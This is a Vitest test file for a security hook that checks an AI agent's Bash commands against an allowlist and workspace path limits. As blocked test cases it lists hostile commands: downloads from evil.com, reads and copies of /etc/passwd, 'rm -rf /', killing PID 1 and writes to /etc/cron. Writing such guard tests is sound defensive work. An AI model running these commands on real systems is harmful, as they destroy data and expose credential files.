import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { bashSecurityHook } from "./bash-hook.js";
import type { Config } from "../core/types.js";

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

/**
 * Build a minimal Config object for testing.
 *
 * Uses a small allowlist so we can explicitly test both allowed and blocked
 * commands. The workspace is set to a temporary directory created per test.
 */
function makeTestConfig(workspaceDir: string): Config {
  return {
    security: {
      allowedCommands: [
        "ls",
        "cat",
        "echo",
        "grep",
        "head",
        "tail",
        "wc",
        "cp",
        "mv",
        "rm",
        "kill",
        "mkdir",
        "touch",
        "node",
        "git",
      ],
      commandsNeedingExtraValidation: ["rm", "kill"],
      workspace: workspaceDir,
      dataDir: path.join(workspaceDir, ".data"),
      additionalReadDirs: [],
      additionalWriteDirs: [],
    },
    adapters: {
      telegram: {
        enabled: false,
        botToken: "",
        allowedUserIds: [],
        mode: "polling",
      },
      slack: {
        enabled: false,
        botToken: "",
        appToken: "",
        socketMode: true,
      },
    },
    heartbeat: {
      enabled: false,
      intervalMinutes: 30,
      activeHours: "8-21",
      deliverTo: "last",
    },
    gateway: { maxQueueSize: 20 },
    agent: { model: null, maxTurns: 200 },
    session: { maxHistoryMessages: 50, compactionEnabled: true },
    memory: {
      search: {
        enabled: false,
        hybridWeights: { vector: 0.7, keyword: 0.3 },
        minScore: 0.35,
        maxResults: 6,
        chunkTokens: 400,
        chunkOverlap: 80,
      },
      extraPaths: [],
    },
    mcpServers: {},
  };
}

/** Shorthand to build a Bash tool input object. */
function bashInput(command: string) {
  return { tool_name: "Bash", tool_input: { command } };
}

/** Shorthand to build a non-Bash tool input object. */
function nonBashInput() {
  return { tool_name: "Read", tool_input: { file_path: "/some/file" } };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("bashSecurityHook", () => {
  let tmpDir: string;
  let workspaceDir: string;
  let config: Config;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bash-hook-test-"));
    workspaceDir = path.join(tmpDir, "workspace");
    fs.mkdirSync(workspaceDir, { recursive: true });
    config = makeTestConfig(workspaceDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // -------------------------------------------------------------------------
  // Allowed simple command passes
  // -------------------------------------------------------------------------

  describe("allowed simple commands", () => {
    it("returns {} for an allowed simple command: ls -la", async () => {
      const result = await bashSecurityHook(
        bashInput("ls -la"),
        "tool-1",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("returns {} for another allowed command: echo hello", async () => {
      const result = await bashSecurityHook(
        bashInput("echo hello"),
        "tool-2",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("returns {} for git status", async () => {
      const result = await bashSecurityHook(
        bashInput("git status"),
        "tool-3",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });
  });

  // -------------------------------------------------------------------------
  // Blocked command returns { decision: "block", reason: "..." }
  // -------------------------------------------------------------------------

  describe("blocked commands", () => {
    it("blocks wget (not in allowlist)", async () => {
      const result = await bashSecurityHook(
        bashInput("wget http://evil.com"),
        "tool-4",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
      expect(result).toHaveProperty("reason");
      expect(typeof (result as { reason: string }).reason).toBe("string");
    });

    it("blocks curl (not in allowlist)", async () => {
      const result = await bashSecurityHook(
        bashInput("curl http://evil.com"),
        "tool-5",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("blocks python3 (not in allowlist)", async () => {
      const result = await bashSecurityHook(
        bashInput("python3 script.py"),
        "tool-6",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });
  });

  // -------------------------------------------------------------------------
  // Piped commands all validated
  // -------------------------------------------------------------------------

  describe("piped commands", () => {
    it("allows piped commands when all are in allowlist: cat file | grep x", async () => {
      const result = await bashSecurityHook(
        bashInput("cat file | grep x"),
        "tool-7",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("blocks piped commands when one is not in allowlist: cat file | wget x", async () => {
      const result = await bashSecurityHook(
        bashInput("cat file | wget x"),
        "tool-8",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("allows a longer pipeline of allowed commands", async () => {
      const result = await bashSecurityHook(
        bashInput("cat file | grep pattern | head -5 | wc -l"),
        "tool-9",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });
  });

  // -------------------------------------------------------------------------
  // Path outside workspace blocked
  // -------------------------------------------------------------------------

  describe("path validation - outside workspace", () => {
    it("blocks cat /etc/passwd (path outside workspace)", async () => {
      const result = await bashSecurityHook(
        bashInput("cat /etc/passwd"),
        "tool-10",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
      expect((result as { reason: string }).reason).toBeDefined();
    });

    it("blocks commands accessing /usr/local/bin", async () => {
      const result = await bashSecurityHook(
        bashInput("cat /usr/local/bin/something"),
        "tool-11",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });
  });

  // -------------------------------------------------------------------------
  // Path within workspace allowed
  // -------------------------------------------------------------------------

  describe("path validation - within workspace", () => {
    it("allows cat ./myfile.txt (relative path within workspace)", async () => {
      const result = await bashSecurityHook(
        bashInput("cat ./myfile.txt"),
        "tool-12",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("allows cat on an absolute path within workspace", async () => {
      const filePath = path.join(workspaceDir, "test.txt");
      const result = await bashSecurityHook(
        bashInput(`cat ${filePath}`),
        "tool-13",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });
  });

  // -------------------------------------------------------------------------
  // cp validates both source and destination paths
  // -------------------------------------------------------------------------

  describe("cp path validation", () => {
    it("allows cp when both source and dest are within workspace", async () => {
      const src = path.join(workspaceDir, "a.txt");
      const dest = path.join(workspaceDir, "b.txt");

      const result = await bashSecurityHook(
        bashInput(`cp ${src} ${dest}`),
        "tool-14",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("blocks cp when destination is outside workspace", async () => {
      const src = path.join(workspaceDir, "a.txt");

      const result = await bashSecurityHook(
        bashInput(`cp ${src} /etc/shadow`),
        "tool-15",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("blocks cp when source is outside workspace", async () => {
      const dest = path.join(workspaceDir, "stolen.txt");

      const result = await bashSecurityHook(
        bashInput(`cp /etc/passwd ${dest}`),
        "tool-16",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });
  });

  // -------------------------------------------------------------------------
  // mv validates both source and destination paths
  // -------------------------------------------------------------------------

  describe("mv path validation", () => {
    it("allows mv when both source and dest are within workspace", async () => {
      const src = path.join(workspaceDir, "old.txt");
      const dest = path.join(workspaceDir, "new.txt");

      const result = await bashSecurityHook(
        bashInput(`mv ${src} ${dest}`),
        "tool-17",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("blocks mv when destination is outside workspace", async () => {
      const src = path.join(workspaceDir, "data.txt");

      const result = await bashSecurityHook(
        bashInput(`mv ${src} /tmp/exfiltrated`),
        "tool-18",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("blocks mv when source is outside workspace", async () => {
      const dest = path.join(workspaceDir, "moved.txt");

      const result = await bashSecurityHook(
        bashInput(`mv /etc/hosts ${dest}`),
        "tool-19",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });
  });

  // -------------------------------------------------------------------------
  // chmod, curl, and wget path validation
  // -------------------------------------------------------------------------

  describe("chmod, curl, and wget path validation", () => {
    let extendedConfig: Config;

    beforeEach(() => {
      extendedConfig = makeTestConfig(workspaceDir);
      extendedConfig.security.allowedCommands = [
        ...extendedConfig.security.allowedCommands,
        "chmod",
        "curl",
        "wget",
      ];
    });

    it("blocks chmod when path is outside workspace", async () => {
      const result = await bashSecurityHook(
        bashInput("chmod 755 /etc/passwd"),
        "tool-40",
        { workspaceDir, config: extendedConfig },
      );

      expect(result).toHaveProperty("decision", "block");
      expect((result as { reason: string }).reason).toBeDefined();
    });

    it("allows chmod when path is within workspace", async () => {
      const filePath = path.join(workspaceDir, "script.sh");

      const result = await bashSecurityHook(
        bashInput(`chmod 755 ${filePath}`),
        "tool-41",
        { workspaceDir, config: extendedConfig },
      );

      expect(result).toEqual({});
    });

    it("blocks curl -o when output path is outside workspace", async () => {
      const result = await bashSecurityHook(
        bashInput("curl -o /etc/malicious http://example.com"),
        "tool-42",
        { workspaceDir, config: extendedConfig },
      );

      expect(result).toHaveProperty("decision", "block");
      expect((result as { reason: string }).reason).toBeDefined();
    });

    it("allows curl -o when output path is within workspace", async () => {
      const filePath = path.join(workspaceDir, "file.txt");

      const result = await bashSecurityHook(
        bashInput(`curl -o ${filePath} http://example.com`),
        "tool-43",
        { workspaceDir, config: extendedConfig },
      );

      expect(result).toEqual({});
    });

    it("blocks wget -O when output path is outside workspace", async () => {
      const result = await bashSecurityHook(
        bashInput("wget -O /tmp/evil http://example.com"),
        "tool-44",
        { workspaceDir, config: extendedConfig },
      );

      expect(result).toHaveProperty("decision", "block");
      expect((result as { reason: string }).reason).toBeDefined();
    });

    it("allows wget -O when output path is within workspace", async () => {
      const filePath = path.join(workspaceDir, "download.txt");

      const result = await bashSecurityHook(
        bashInput(`wget -O ${filePath} http://example.com`),
        "tool-45",
        { workspaceDir, config: extendedConfig },
      );

      expect(result).toEqual({});
    });
  });

  // -------------------------------------------------------------------------
  // Output redirection validates target path
  // -------------------------------------------------------------------------

  describe("output redirection path validation", () => {
    it("blocks output redirection to path outside workspace: echo x > /etc/cron", async () => {
      const result = await bashSecurityHook(
        bashInput("echo x > /etc/cron"),
        "tool-20",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("allows output redirection to path within workspace", async () => {
      const targetPath = path.join(workspaceDir, "output.txt");

      const result = await bashSecurityHook(
        bashInput(`echo x > ${targetPath}`),
        "tool-21",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("blocks append redirection to path outside workspace", async () => {
      const result = await bashSecurityHook(
        bashInput("echo data >> /var/log/system.log"),
        "tool-22",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });
  });

  // -------------------------------------------------------------------------
  // Non-Bash tool calls pass through unchanged
  // -------------------------------------------------------------------------

  describe("non-Bash tool passthrough", () => {
    it("returns {} for non-Bash tool calls", async () => {
      const result = await bashSecurityHook(
        nonBashInput(),
        "tool-23",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("returns {} for Write tool calls", async () => {
      const result = await bashSecurityHook(
        { tool_name: "Write", tool_input: { file_path: "/some/file", content: "x" } },
        "tool-24",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("returns {} for an MCP tool call", async () => {
      const result = await bashSecurityHook(
        { tool_name: "mcp__memory__search", tool_input: { query: "test" } },
        "tool-25",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });
  });

  // -------------------------------------------------------------------------
  // Empty command returns {}
  // -------------------------------------------------------------------------

  describe("empty command", () => {
    it("returns {} for empty command string", async () => {
      const result = await bashSecurityHook(
        bashInput(""),
        "tool-26",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("returns {} for whitespace-only command string", async () => {
      const result = await bashSecurityHook(
        bashInput("   "),
        "tool-27",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });
  });

  // -------------------------------------------------------------------------
  // Commands needing extra validation (rm, kill) get additional checks
  // -------------------------------------------------------------------------

  describe("commands needing extra validation", () => {
    it("blocks rm -rf / (dangerous rm)", async () => {
      const result = await bashSecurityHook(
        bashInput("rm -rf /"),
        "tool-28",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("blocks rm -rf /* (dangerous rm pattern)", async () => {
      const result = await bashSecurityHook(
        bashInput("rm -rf /*"),
        "tool-29",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("allows rm on a file within workspace", async () => {
      const result = await bashSecurityHook(
        bashInput("rm old-file.txt"),
        "tool-30",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("blocks kill of PID 1 (init)", async () => {
      const result = await bashSecurityHook(
        bashInput("kill 1"),
        "tool-31",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("blocks kill -9 of PID 1", async () => {
      const result = await bashSecurityHook(
        bashInput("kill -9 1"),
        "tool-32",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });

    it("allows kill of a normal PID", async () => {
      const result = await bashSecurityHook(
        bashInput("kill 12345"),
        "tool-33",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("blocks rm -rf on system directories", async () => {
      const result = await bashSecurityHook(
        bashInput("rm -rf /etc"),
        "tool-34",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });
  });

  // -------------------------------------------------------------------------
  // Chained commands: all commands must be allowed
  // -------------------------------------------------------------------------

  describe("chained commands", () => {
    it("allows chained commands when all are in allowlist", async () => {
      const result = await bashSecurityHook(
        bashInput("echo hello && ls -la"),
        "tool-35",
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("blocks chained commands when one is not in allowlist", async () => {
      const result = await bashSecurityHook(
        bashInput("echo hello && wget http://evil.com"),
        "tool-36",
        { workspaceDir, config },
      );

      expect(result).toHaveProperty("decision", "block");
    });
  });

  // -------------------------------------------------------------------------
  // Edge case: undefined toolUseId
  // -------------------------------------------------------------------------

  describe("edge cases", () => {
    it("handles undefined toolUseId", async () => {
      const result = await bashSecurityHook(
        bashInput("ls"),
        undefined,
        { workspaceDir, config },
      );

      expect(result).toEqual({});
    });

    it("handles missing command in tool_input", async () => {
      const result = await bashSecurityHook(
        { tool_name: "Bash", tool_input: {} },
        "tool-37",
        { workspaceDir, config },
      );

      // No command to validate, should pass through
      expect(result).toEqual({});
    });
  });
});
